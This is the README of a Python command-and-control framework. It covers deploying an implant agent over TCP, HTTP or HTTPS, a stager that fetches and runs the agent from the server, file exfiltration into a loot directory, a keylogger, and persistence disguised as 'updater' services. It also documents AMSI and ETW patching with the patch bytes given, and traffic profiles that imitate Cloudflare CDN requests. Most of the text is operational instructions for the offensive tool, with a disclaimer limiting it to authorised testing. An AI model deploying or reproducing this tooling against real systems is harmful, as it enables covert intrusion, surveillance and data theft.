# Python C2 Framework

A complete Command & Control framework written from scratch in Python.
Multi-transport (TCP / HTTP / HTTPS), end-to-end encrypted, multi-operator
with role-based access control, plugin-style post-exploitation modules,
agent staging, and SQLite persistence.

> ## ⚠️ LEGAL DISCLAIMER
>
> This project is provided for **authorized penetration testing, red team
> engagements, CTF competitions, and educational use in controlled lab
> environments only**.
>
> You must have **explicit, written permission** from the owner of any
> system you test with this software. Unauthorized access to computer
> systems is illegal under laws including (but not limited to) the U.S.
> Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and the
> EU Directive on Attacks Against Information Systems.
>
> The author(s) accept **no liability** for misuse, damage, or legal
> consequences arising from the use of this code. **You are solely
> responsible** for your actions.

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
  - [1. Start the Server](#1-start-the-server)
  - [2. Deploy the Agent](#2-deploy-the-agent)
  - [3. Operate the Server](#3-operate-the-server)
  - [4. Remote Operators](#4-remote-operators)
  - [5. Agent Staging](#5-agent-staging)
- [Command Reference](#command-reference)
- [Transports](#transports)
- [Cryptography](#cryptography)
- [Operator Roles (RBAC)](#operator-roles-rbac)
- [Malleable Profiles](#malleable-profiles)
- [Post-Exploitation Modules](#post-exploitation-modules)
- [Project Layout](#project-layout)
- [File & Loot Management](#file--loot-management)
- [Troubleshooting](#troubleshooting)
- [Extending the Framework](#extending-the-framework)

---

## Features

### Communication
- **Three transports** — raw TCP, HTTP, and HTTPS (auto-generated self-signed TLS cert)
- **Beaconing with jitter** — configurable interval and randomized sleep (±30% by default)
- **Length-prefixed framing** — reliable delivery of large payloads over raw sockets
- **Automatic reconnection with exponential backoff** — agents retry when the
  server is unreachable, backing off from 10s up to 300s
- **Stable agent identity across reconnects** — each machine is assigned a
  persistent `machine_id`; reconnecting agents keep the same agent ID in the
  operator's `list`, so task history isn't fragmented

### Cryptography
- **RSA-2048 OAEP** key exchange on registration
- **Per-agent AES-256-GCM** session keys (authenticated encryption — tampering is detected)
- **Unique session key per agent**, never shared, never persisted in plaintext on the agent

### Operator Experience
- **Local admin console** (runs in the server process)
- **Remote operator CLI** with authenticated login (port 5555)
- **Role-based access control** — `admin`, `operator`, `viewer`
- **SQLite backend** — agents, tasks, results, operators, profiles, and loot all persisted
- **Multi-operator support** — several red teamers can drive the same server simultaneously
- **Automatic offline detection** — agents that miss beacons for 5 minutes are
  marked `dead` (works for TCP, HTTP, and HTTPS transports alike)

### Post-Exploitation
- Shell command execution
- File upload / download with automatic loot collection
- System information, process listing, environment variables
- Persistence — cron, rc, systemd, Windows registry, schtask, launchagent, startup folder
- Screenshot capture
- Privilege escalation enumeration (Linux + Windows)
- Windows AMSI bypass (patches `AmsiScanBuffer`)
- Windows ETW patching (patches `EtwEventWrite`, 32-bit and 64-bit safe)
- Keylogger (start / dump / stop)

### Evasion & OPSEC
- **Malleable HTTP profiles** — custom URIs, headers, and User-Agent to blend with normal traffic
- **Agent staging** — small stager pulls the full agent from the server at runtime
- **Beacon jitter** — breaks predictable network patterns

---

## Architecture

```
                    ┌──────────────────────────────────┐
                    │        c2 server (server.py)     │
                    │                                  │
   ┌────────────┐   │  ┌──────────┐  ┌─────────────┐   │   ┌──────────────┐
   │  Agent     │───┼─▶│  TCP     │  │  HTTP /     │◀──┼───│  Remote      │
   │ (agent.py) │   │  │  :4444   │  │  HTTPS      │   │   │  Operator    │
   │            │───┼─▶│          │  │  :8080/8443 │   │   │ (operator.py)│
   └────────────┘   │  └──────────┘  └─────────────┘   │   │   :5555      │
                    │                                  │   └──────────────┘
   ┌────────────┐   │  ┌──────────┐  ┌─────────────┐   │
   │  Stager    │───┼─▶│ /stage   │  │  Local      │   │   ┌──────────────┐
   │(stager.py) │   │  │ endpoint │  │  Console    │   │◀──│  loot/ dir   │
   └────────────┘   │  └──────────┘  └─────────────┘   │   └──────────────┘
                    │                                  │
                    │  ┌────────────────────────────┐  │
                    │  │  SQLite (c2.db)            │  │
                    │  │  agents · tasks · results  │  │
                    │  │  operators · profiles      │  │
                    │  └────────────────────────────┘  │
                    └──────────────────────────────────┘
```

---

## Requirements

- **Python 3.10+** (3.11 or 3.12 recommended)
- Operating systems:
  - **Server** — Linux, macOS, or Windows
  - **Agent** — Linux, macOS, Windows
- Network access between agent and server on the chosen port

### Python dependencies

| Package | Purpose |
|---|---|
| `cryptography` | RSA key exchange + AES-GCM session encryption |
| `flask` | HTTP/HTTPS agent transport |
| `werkzeug` | Threaded Flask server |
| `requests` | Agent HTTP/HTTPS client |
| `pillow` | Screenshot capture |
| `pynput` | Keylogger |

---

## Installation

```bash
git clone <this-repo>
cd Python-C2-Framework

python -m venv venv
source venv/bin/activate          # Linux/macOS
venv\Scripts\activate              # Windows

pip install -r requirements.txt
```

---

## Quick Start

```bash
# ── On the server ────────────────────────────────────────────────
python server.py
# On first run:
#   * You are prompted to set the admin password
#   * RSA keypair is generated (server_private.pem, server_public.pem)
#   * Self-signed TLS cert is generated (server.crt, server.key)
#   * SQLite database is created (c2.db)
#   * loot/ directory is created

# ── On the target ────────────────────────────────────────────────
# Copy server_public.pem + agent.py to the target, then:
python agent.py --transport http --url http://<SERVER_IP>:8080

# ── Back on the server (local console) ──────────────────────────
[c2:none] > list
[c2:none] > use <agent_id_prefix>
[c2:<id>] > sysinfo
[c2:<id>] > shell whoami
[c2:<id>] > shell ipconfig          # or `ip a` on Linux
[c2:<id>] > download C:\Users\Public\secret.txt
[c2:<id>] > screenshot
[c2:<id>] > privesc
```

---

## Usage

### 1. Start the Server

```bash
python server.py
```

On the **first** run the server:

1. Prompts you to set the admin operator password (stored hashed with
   PBKDF2-HMAC-SHA256, 200,000 iterations).
2. Generates an RSA-2048 key pair:
   - `server_private.pem` — **never** leave the server
   - `server_public.pem` — must be copied to every agent machine
3. Generates a self-signed TLS certificate (`server.crt`, `server.key`).
4. Creates the SQLite database (`c2.db`).
5. Creates the `loot/` directory for exfiltrated files.

Once running, four listeners start on these ports:

| Port | Purpose |
|---|---|
| `4444` | TCP agent transport |
| `8080` | HTTP agent transport |
| `8443` | HTTPS agent transport (TLS) |
| `5555` | Remote operator transport (RBAC login) |

The local admin console is available in the same terminal.

---

### 2. Deploy the Agent

Copy `agent.py` **and** `server_public.pem` to the target machine, then
start the agent with the transport of your choice:

```bash
# TCP transport
python agent.py --transport tcp --host <SERVER_IP> --port 4444

# HTTP transport
python agent.py --transport http --url http://<SERVER_IP>:8080

# HTTPS transport (self-signed cert, so pass --insecure)
python agent.py --transport https --url https://<SERVER_IP>:8443 --insecure

# Custom malleable profile
python agent.py --transport http --url http://<SERVER_IP>:8080 --profile myprofile.json

# Custom public key location
python agent.py --transport http --url http://<SERVER_IP>:8080 --pubkey /path/to/server_public.pem
```

The agent prints its `agent_id` when registration succeeds. The server
prints the same ID when it receives the registration.

#### Reconnect behavior

If the agent loses its connection, it retries with exponential backoff
(10s → 20s → 40s ... up to 300s). On successful reconnect, the agent
keeps its **same agent ID** (matched via a persistent `machine_id` that
is a hash of the target's hostname, MAC, and architecture). This means
your `use <id>` selection, task history, and loot filenames remain
stable across reconnects. If the target's hostname or MAC changes (e.g.,
new NIC, VM cloned), it will appear as a new agent.

#### Agent CLI options

| Flag | Description |
|---|---|
| `--transport {tcp,http,https}` | Transport to use (default: `tcp`) |
| `--host <ip>` | Server IP for TCP transport |
| `--port <int>` | Server port (overrides default per transport) |
| `--url <url>` | Full URL for HTTP/HTTPS transport |
| `--profile <file>` | Path to a malleable profile JSON file |
| `--pubkey <file>` | Path to `server_public.pem` (default: `./server_public.pem`) |
| `--insecure` | Skip TLS verification on HTTPS transport |

---

### 3. Operate the Server

The **local admin console** appears in the server's terminal.

```
Commands:
  list                                 List agents
  use <id_prefix>                      Select agent
  back                                 Deselect
  shell <command>                      Execute shell command (queued)
  sysinfo                              Remote system info
  ps                                   Process list
  env                                  Environment variables
  download <remote_path>               Exfil file (saved to loot/)
  upload <local_path> <remote_path>    Push file
  persist <type>                       cron|rc|systemd|registry|schtask|startup|launchagent
  screenshot                           Capture screenshot
  privesc                              Enumerate privilege escalation vectors
  amsi                                 Windows AMSI bypass
  etw                                  Windows ETW patch
  keylog_start | keylog_dump | keylog_stop
  results                              Show results for selected agent
  list_operators                       List operators (admin)
  add_operator <u> <p> <role>          Add operator   (admin)
  remove_operator <u>                  Remove operator(admin)
  list_profiles                        List malleable profiles
  add_profile <path.json>              Add profile from JSON (admin)
  help                                 Show this
  exit                                 Shutdown server
```

Every command that touches an agent is **queued** and delivered on the
agent's **next beacon**. Results arrive on the beacon that follows task
delivery. Nothing is pushed out-of-band.

---

### 4. Remote Operators

The operator port (5555) lets other machines control the teamserver with
authentication and role-based access control.

```bash
python operator.py <SERVER_IP> 5555
```

You will be prompted for a username and password. Create new operators
from the local admin console:

```
[c2:none] > add_operator alice hunter2 operator
[c2:none] > add_operator bob   viewpw   viewer
[c2:none] > add_operator carol adminpw  admin
[c2:none] > list_operators
```

See [Operator Roles (RBAC)](#operator-roles-rbac) for what each role can do.

---

### 5. Agent Staging

The stager is a tiny (~40 lines) bootstrap that downloads the full agent
from the server's `/stage` endpoint and runs it. This bypasses size-based
file detection and lets you update the agent without re-deploying.

```bash
# Place the payload on the server next to server.py:
cp agent.py agent_payload.py     # (on the server)

# On the target machine:
python stager.py http://<SERVER_IP>:8080 --transport http --url http://<SERVER_IP>:8080
```

The stager warns you if it can't find `server_public.pem` in the
current directory, because the agent will fail to register without it.

---

## Command Reference

### Agent management

| Command | Description |
|---|---|
| `list` | Show all registered agents with status and last-beacon time |
| `use <prefix>` | Select an agent by ID prefix (must be unambiguous) |
| `back` | Deselect the current agent |

### Tasking

All tasking commands require a selected agent and queue a task for the
agent's next beacon.

| Command | Description |
|---|---|
| `shell <cmd>` | Execute a shell command |
| `sysinfo` | Return hostname, user, OS, arch, PID, machine_id |
| `ps` | List running processes (`tasklist` / `ps aux`) |
| `env` | Dump environment variables |
| `download <remote>` | Exfiltrate a file (auto-saved to `loot/`) |
| `upload <local> <remote>` | Push a file to the agent |
| `persist <kind>` | Install persistence (see table below) |
| `screenshot` | Capture the screen (PNG, base64) |
| `privesc` | Enumerate privilege escalation vectors |
| `amsi` | Patch `AmsiScanBuffer` (Windows only) |
| `etw` | Patch `EtwEventWrite` (Windows only, 32/64-bit safe) |
| `keylog_start` / `keylog_dump` / `keylog_stop` | Control the keylogger |
| `results` | Show recent results for the selected agent |

### Operator management (admin only)

| Command | Description |
|---|---|
| `list_operators` | Show all operators and their roles |
| `add_operator <user> <pw> <role>` | Create an operator (`admin` / `operator` / `viewer`) |
| `remove_operator <user>` | Delete an operator |

### Profiles (admin only)

| Command | Description |
|---|---|
| `list_profiles` | Show all malleable profiles |
| `add_profile <path.json>` | Register a new profile from a JSON file |

---

## Transports

### TCP (port 4444)

- Raw sockets with 4-byte big-endian length-prefix framing.
- Bidirectional; the server replies on the same connection.
- Fastest and lowest overhead, but firewall-friendly only on trusted networks.

### HTTP (port 8080)

- Stateful via `X-Agent-Id` request header (injected by the agent).
- Registration, beacon, and result submission are separate POST requests.
- Blends with standard web traffic; passes through most egress firewalls.

### HTTPS (port 8443)

- Same Flask app as HTTP, wrapped in TLS with an auto-generated cert.
- Agent must use `--insecure` because the cert is self-signed.
- For real engagements, replace `server.crt` and `server.key` with a
  valid certificate (Let's Encrypt, internal CA, or a C2-specific domain).

### Comparison

| Transport | Speed | Evasion | Firewall-friendly | Requires cert |
|---|---|---|---|---|
| TCP | Fastest | Low | No | No |
| HTTP | Fast | Good | Yes | No |
| HTTPS | Fast | Best | Yes | Yes (self-signed is fine) |

---

## Cryptography

### Registration (RSA-2048 OAEP)

```
Agent                                    Server
  │                                        │
  │  1. Generate 32-byte session_key       │
  │  2. Build {session_key, info} JSON     │
  │  3. RSA-OAEP(SHA-256, public_key)      │
  │ ────── encrypted registration ───────▶ │
  │                                        │  4. RSA decrypt → extract
  │                                        │     session_key + info
  │                                        │  5. Match on machine_id or
  │                                        │     create new agent record
  │ ◀──── AES-GCM({status, agent_id}) ──── │  6. Reply with agent_id
  │                                        │     (encrypted with session_key)
```

### Session encryption (AES-256-GCM)

Every message after registration is encrypted with the per-agent
`session_key` using **AES-256-GCM**:

- 12-byte random nonce per message (prepended to ciphertext)
- Authenticated encryption — any tampering invalidates the message
- No shared global key — compromising one agent does not compromise others

### Key storage

| File | Contains | Where it lives |
|---|---|---|
| `server_private.pem` | RSA private key | Server only — **never** distribute |
| `server_public.pem` | RSA public key | Server + every agent machine |
| `c2.db` (`agents.session_key`) | Per-agent AES keys | Server only |
| In-memory | Agent session key | Agent process only |

Session keys are **never** written to disk by the agent.

---

## Operator Roles (RBAC)

Three roles are enforced by `C2Core.process_command()`:

| Action | `viewer` | `operator` | `admin` |
|---|:---:|:---:|:---:|
| `list` / `use` / `results` | ✅ | ✅ | ✅ |
| Task agents (`shell`, `download`, etc.) | ❌ | ✅ | ✅ |
| `list_operators` | ❌ | ❌ | ✅ |
| `add_operator` / `remove_operator` | ❌ | ❌ | ✅ |
| `list_profiles` | ✅ | ✅ | ✅ |
| `add_profile` | ❌ | ❌ | ✅ |

Passwords are stored as `salt:pbkdf2_hmac_sha256(password, salt, 200000)`
in the `operators` table — never in plaintext.

---

## Malleable Profiles

A malleable profile controls the HTTP request shape the agent uses, so
it blends into normal web traffic. Register profiles from either console
(admin only) by pointing at a JSON file.

### Example profile file (`myprofile.json`)

```json
{
  "name": "cloudflare_cdn",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "register_uri": "/cdn-cgi/trace/auth",
  "beacon_uri": "/cdn-cgi/trace/refresh",
  "result_uri": "/cdn-cgi/trace/log",
  "headers": {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "X-Forwarded-For": "127.0.0.1"
  }
}
```

### Registering it

On the server console:

```
[c2:none] > add_profile /path/to/myprofile.json
```

From a remote operator:

```
[admin:none] > add_profile /path/to/myprofile.json
```

The `path` is resolved **on the server** — so the file has to be
readable by the server process, not the operator's machine.

### Using it from the agent

Pass the profile to the agent at startup:

```bash
python agent.py --transport http --url http://<SERVER_IP>:8080 --profile myprofile.json
```

The server must already know about the URIs in the profile (via
`add_profile`) — otherwise requests to those URIs return 404.

---

## Post-Exploitation Modules

Every module below is dispatched by `execute_task()` in `agent.py`.
Output is returned as a string over the encrypted channel.

### `shell`

```python
subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=180)
```

Runs `cmd` and returns `stdout + stderr`.

### `sysinfo`

Returns JSON with `hostname`, `user`, `os`, `os_version`, `arch`, `pid`,
and `machine_id`.

### `ps`

Windows: `tasklist` — Unix: `ps aux`.

### `env`

Dumps `os.environ` as `key=value` lines.

### `download` / `upload`

Base64-encoded file content is carried inside the encrypted JSON. On
download, the server decodes it and saves it to `loot/<agent>_<file>`.

### `persist`

| `kind` | Platform | Action |
|---|---|---|
| `cron` | Linux | Adds a `*/10 * * * *` cron entry |
| `rc` | Linux | Appends to `~/.bashrc` |
| `systemd` | Linux | Creates `~/.config/systemd/user/updater.service` |
| `registry` | Windows | `HKCU\...\CurrentVersion\Run` |
| `schtask` | Windows | `schtasks /create /sc minute /mo 30` |
| `startup` | Windows | Copies to the Startup folder |
| `launchagent` | macOS | Creates `~/Library/LaunchAgents/com.apple.updater.plist` |

### `screenshot`

Tries, in order: ImageMagick `import` → `scrot` → Pillow `ImageGrab`.
Returns base64 PNG.

### `privesc`

Runs a battery of enumeration commands:

- **Linux**: `id`, `sudo -l`, SUID binary scan, `uname -a`,
  write-check on `/etc/passwd` and `/etc/shadow`, cron jobs
- **Windows**: `whoami /priv`, `whoami /groups`, `systeminfo` (hotfixes
  and OS version), unquoted service paths, `C:\Windows\Temp` ACLs

### `amsi` (Windows only)

Patches `amsi.dll!AmsiScanBuffer` with `mov eax, 0x80070057; ret`, so
all AMSI scans return `E_INVALIDARG` (which most .NET hosts treat as
"not malicious").

### `etw` (Windows only)

Patches `ntdll.dll!EtwEventWrite` with `xor rax, rax; ret` on 64-bit or
`xor eax, eax; ret` on 32-bit, disabling ETW events produced by .NET
assemblies. The correct patch is selected automatically based on the
Python interpreter's bitness.

### `keylog_start` / `keylog_dump` / `keylog_stop`

Uses `pynput.keyboard.Listener`. Logs to a random `tempfile` path; the
`dump` action returns the last 100 KB.

---

## Project Layout

```
Python-C2-Framework/
├── README.md            ← this file
├── requirements.txt     ← Python dependencies
├── common.py            ← shared crypto, framing, default profile
├── server.py            ← teamserver (TCP + HTTP + HTTPS + operator + console)
├── agent.py             ← full implant with all modules
├── operator.py          ← remote operator CLI with RBAC login
├── stager.py            ← tiny stager that downloads and runs the agent
│
├── (generated at runtime)
├── c2.db                ← SQLite database
├── server_private.pem   ← RSA private key (KEEP SECRET)
├── server_public.pem    ← RSA public key (distribute to agents)
├── server.crt           ← self-signed TLS cert
├── server.key           ← TLS private key
└── loot/                ← exfiltrated files
    └── <agent>_<file>
```

---

## File & Loot Management

### Downloads

When the operator issues `download <remote_path>`, the agent reads the
file, base64-encodes it, and returns it inside the encrypted result.
The server decodes it and writes it to:

```
loot/<first 8 chars of agent_id>_<basename of remote path>
```

Example:

```
loot/4f1a9c2b_secret.txt
```

### Uploads

The operator runs `upload <local_path> <remote_path>`. The server reads
the local file, base64-encodes it into the task, and the agent writes
it to `<remote_path>` on the target. The local path is resolved on the
**operator** machine — if you're a remote operator, that means your
machine, and the file content is shipped to the server over the operator
connection.

### Results

Every result is stored in the `results` table with its `task_id` and
`agent_id`. Use the `results` command to review the last 20 results
for the selected agent (or the last 30 across all agents if none is
selected).

---

## Troubleshooting

### "login required" when connecting an operator

The operator port expects a login message first. Run `operator.py`
(rather than a raw socket) — it handles the login handshake for you.

### Agent never registers

1. Confirm `server_public.pem` on the target matches the server's
   `server_public.pem`. If the server regenerated its keys, both files
   changed.
2. Confirm the target can reach the chosen port
   (`nc -zv <SERVER_IP> 8080`).
3. Check the server's stdout — registration failures print to the console.

### `http 401` on beacon or result

The `X-Agent-Id` header is missing or unknown. Ensure the agent's
`agent_id` matches a row in the `agents` table:

```sql
SELECT id, machine_id, hostname, connected FROM agents;
```

### HTTPS agent fails TLS verification

Add `--insecure` to the agent, or deploy a real certificate. The
auto-generated `server.crt` is **not** signed by any CA.

### Screenshot returns an error

- Linux: install `scrot` or ImageMagick (`import`)
- Windows / macOS: `pip install pillow`
- Headless Linux (no X/Wayland): will fail regardless — expected

### AMSI/ETW modules return "[!] Windows only"

Those patches only make sense on Windows and rely on `ctypes.windll`.
Running them on Linux/macOS returns that message.

### Keylogger says "pynput not installed"

```bash
pip install pynput
```

On Linux, `pynput` also needs an X server. On headless servers, use a
different `on_press` handler (e.g., log to file from the agent's own
process).

### Agents show "dead" too quickly / too slowly

The watchdog marks agents offline after `BEACON_TIMEOUT = 300` seconds
(5 minutes) without a beacon. Change this constant at the top of
`server.py` if you need a different threshold. The agent-side beacon
interval is `BEACON_INTERVAL = 5` seconds (with ±30% jitter) — change
this at the top of `agent.py`.

### Same target appears twice in `list`

The `machine_id` hash is `sha256(hostname|mac|arch)`. If any of those
change (VM cloned, NIC swapped, hostname renamed), the server treats it
as a new agent. You can merge duplicates manually with SQL or accept
it as expected behaviour for cloned VMs.

### Looted file is truncated or corrupt

Base64 payloads are carried in a single JSON blob. For very large files
(hundreds of MB), the encrypted payloads get unwieldy. The framework
works reliably up to a few MB; beyond that, chunk the download across
multiple tasks.

---

## Extending the Framework

### Add a new post-exploitation module

1. In `agent.py`, add a handler function:

   ```python
   def _my_module(args):
       return "result string"
   ```

2. Add a dispatch entry inside `execute_task()`:

   ```python
   if cmd == "my_module": return _my_module(a)
   ```

3. In `server.py`, add it to the `process_command` whitelist:

   ```python
   if name in ("shell", ..., "my_module"):
       ...
   ```

4. Add a `parse_line()` branch in `server.py` and `operator.py` so it
   builds the right cmd dict (unless you only need the default
   `{"cmd": "my_module"}` payload).

### Add a new transport

Subclass the pattern used by `HTTPTransport`:

```python
class MyTransport:
    def connect(self): ...
    def register(self, enc_payload) -> bytes: ...
    def beacon(self, agent_id, enc_beacon) -> bytes: ...
    def submit(self, agent_id, enc_result): ...
```

Then wire a corresponding server listener that decrypts the registration
with `rsa_decrypt(core.priv, ...)`, calls `core.register_agent(...)`,
and serves `core.beacon(aid)` / `core.submit_result(aid, ...)` the same
way the existing listeners do.

### Add a new operator role

Edit the role checks in `C2Core.process_command()` and add the new role
name to `add_operator`'s validation tuple:

```python
if r not in ("admin", "operator", "viewer", "auditor"):
    return {"status": "error", "msg": "bad role"}
```

### Swap the database

`DB` is a thin wrapper around `sqlite3`. To move to PostgreSQL or MySQL,
replace its implementation — every call site uses `db.query()` and
`db.execute()`, so the rest of the code does not change.

---

## License

This project is provided **for educational and authorized security
testing purposes only**. No license is granted for use against systems
you do not own or have explicit written permission to test.

**Use at your own risk. You are responsible for your actions.**
